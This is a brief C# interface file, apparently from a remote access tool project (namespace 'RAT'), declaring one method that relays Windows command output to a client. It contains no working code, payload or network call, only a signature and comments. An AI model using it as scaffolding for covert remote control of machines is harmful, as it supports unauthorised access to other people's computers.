using System.Diagnostics;

namespace RAT.Interfaces
{
    /// <summary>
    /// Logic related to windows cmd.
    /// </summary>
    public interface ICmdLogic
    {
        /// <summary>
        /// This will send command execution output result to client regardless of output being error or not.
        /// </summary>
        /// <param name="sendingProcess">Sender.</param>
        /// <param name="outLine">Event sender's data.</param>
        void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine);
    }
}